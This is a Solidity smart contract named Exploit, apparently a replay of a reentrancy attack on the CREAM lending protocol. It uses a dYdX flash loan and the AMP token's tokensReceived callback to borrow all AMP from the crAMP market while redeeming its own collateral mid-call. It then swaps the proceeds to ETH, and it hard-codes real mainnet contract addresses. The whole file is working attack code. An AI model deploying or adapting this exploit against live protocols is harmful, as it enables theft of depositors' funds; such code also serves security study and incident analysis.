//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import './interfaces/ICallee.sol';
import './interfaces/DydxFlashloanBase.sol';

interface ICToken{
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface WETH{
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IComptroller{
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function exitMarket(address fToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface IUniswap{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ICEther{
    function mint() external payable;
    function borrow(uint256) external returns (uint);
    function redeemUnderlying(uint redeemAmount) external returns (uint);
}

interface IAMP{
    function registerCollateralManager() external;
}

interface IERC1820{
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external ;
}

interface IRouter{
    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

contract Exploit is ICallee, DydxFlashloanBase {

    address comptroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address cramp = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address creth = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address cdai = 0x92B767185fB3B04F881e3aC8e5B0662a027A1D9f;

    address amp = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address uniswapPool = 0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E;
    address v2router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address ampwethpool = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;

    address erc1820registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;

    string internal constant AMP_TOKENS_RECIPIENT = "AmpTokensRecipient";

    address soloMargin = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;

    // Set flashloan amount to 20k ETH
    uint256 constant borrowAmount = 12_000 ether;

    struct MyCustomData {
        address token;
        uint repayAmount;
    }

    function start() external {
        console.log("Good to go.");

        /* 
        The token contract MUST register the ERC777Token interface with its own address via ERC-1820.
        This is done by calling the setInterfaceImplementer() function on the ERC-1820 registry with 
        the token contract address as both the address and the implementer and 
        the keccak256 hash of ERC777Token (0xac7fbab5f54a3ca8194167523c6753bfeb96a445279294b6125b68cce2177054) as the interface hash.
        */

        /// @param _addr Address for which to set the interface.
        /// (If '_addr' is the zero address then 'msg.sender' is assumed.)
        /// @param _interfaceHash Keccak256 hash of the name of the interface as a string.
        /// E.g., 'web3.utils.keccak256("ERC777TokensRecipient")' for the 'ERC777TokensRecipient' interface.
        /// @param _implementer Contract address implementing '_interfaceHash' for '_addr'.

        bytes32 interfaceHash = keccak256(abi.encodePacked(AMP_TOKENS_RECIPIENT));
        IERC1820(erc1820registry).setInterfaceImplementer(address(this), interfaceHash, address(this));
        initiateFlashLoan(weth, borrowAmount);

    }

    function initiateFlashLoan(address _token, uint _loanAmount) internal {
        ISoloMargin solo = ISoloMargin(soloMargin);

        /*
        Get marketId from token address:
        0	WETH
        1	SAI
        2	USDC
        3	DAI
        */
        uint256 marketId = _getMarketIdFromTokenAddress(soloMargin, _token);

        // Calculate repay amount (_loanAmount + (2 wei))
        uint256 repayAmount = _getRepaymentAmountInternal(_loanAmount);
        // Approve SOLO contract to send repayAmount from this contract
        IERC20(_token).approve(soloMargin, repayAmount);

        /*
        Three actions to be executed for a dYdX flashLoan to succeed:
        1. Withdraw
        2. Call callFunction()
        3. Deposit back
        */
        
        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        // 1. Withdraw operation
        operations[0] = _getWithdrawAction(marketId, _loanAmount);

        // 2. Call which invokes callFunction(), operation
        operations[1] = _getCallAction(
            abi.encode(MyCustomData({token: weth, repayAmount: repayAmount}))
        );
        
        // 3. Deposit back operation
        operations[2] = _getDepositAction(marketId, repayAmount);

        // Pass account info 
        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);
    }

    // This is the function called by dydx after giving us the loan
    function callFunction(
        address sender, 
        Account.Info memory accountInfo, 
        bytes memory data
        ) public override {
            require(msg.sender == soloMargin, "!solo");
            require(sender == address(this), "!this contract");

            WETH(weth).withdraw(borrowAmount);
            uint256 wethAmount = address(this).balance;
            console.log("WETH borrowed from dYdX: ", wethAmount);
            // We now have a WETH balance of loanAmount.

            // 1. Deposit WETH into crETH market in CREAM
            // Deposit WETH by minting crETH
            // No approval required
            // Minting CEther has no return, reverts on error
            ICEther(creth).mint{value: borrowAmount}();

            // 2. Enter Market Comptroller
            // add the list of crTokens (markets) we want to enter to enable borrowing in these markets
            address[] memory crTokens = new address[](2);
            crTokens[0] = creth;
            crTokens[1] = cramp;
            uint[] memory errors = IComptroller(comptroller).enterMarkets(crTokens);
            require(errors[0] == 0 && errors[1] == 0, "Failed to enter market");

            // 3. Check liquidity for our account in CREAM
            // err should be 0 on success,
            // liq != 0 means that account has available liquidity 
            (uint256 err, uint256 liq, ) = IComptroller(comptroller).getAccountLiquidity(address(this));
            require(err == 0, "getAccountLiqudity() failed");
            require(liq > 0, "account has no liquidity");
            console.log("Liquidity available in CREAM: ", liq);
        
            // 4. Borrow AMP from crAMP market in CREAM
            // Check AMP before borrowing
            uint256 ampAmount = IERC20(amp).balanceOf(address(this));
            console.log("AMP before borrowing from CREAM: ", ampAmount);
            // Borrow/Drain all the AMP in CREAM
            // Enters callback, the tokenReceived() function, by calling this borrow() function
            ampAmount = IERC20(amp).balanceOf(cramp);
            console.log("balance of crAMP: ", ampAmount);
            err = ICToken(cramp).borrow(ampAmount);
            require(err == 0, "Borrowing of AMP from CREAM failed");
            console.log("After callback ends.");
            // Check AMP borrowed
            ampAmount = IERC20(amp).balanceOf(address(this));
            console.log("AMP borrowed from CREAM: ", ampAmount);

            // 5. SWAP AMP for ETH in Uniswap using Router
            IERC20(amp).approve(v2router, type(uint256).max);
            address[] memory path = new address[](2);
            path[0] = amp;
            path[1] = weth;
            uint[] memory amounts = IRouter(v2router).swapExactTokensForETH(ampAmount, 0, path, address(this), block.timestamp);
            console.log("Amounts 1 (Input AMP): ", amounts[0]);
            console.log("Amounts 2 (Output ETH): ", amounts[1]);

            // 6. convert ETH to WETH to repay back the loan later
            WETH(weth).deposit{value: address(this).balance}();

            /*
            the Deposit operation will invoke the transferFrom to pay the loan 
            (or whatever amount it was initialised with) back to itself, there is no need
            to pay it back explicitly.
            */
        
    }

    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        console.log("We are in the callback now");
        // Nested borrow()
        uint256 err = ICToken(creth).redeemUnderlying(borrowAmount);
        require(err == 0, "redeem underlying crETH failed");
    }
    fallback() external payable {}
    receive() external payable {}
}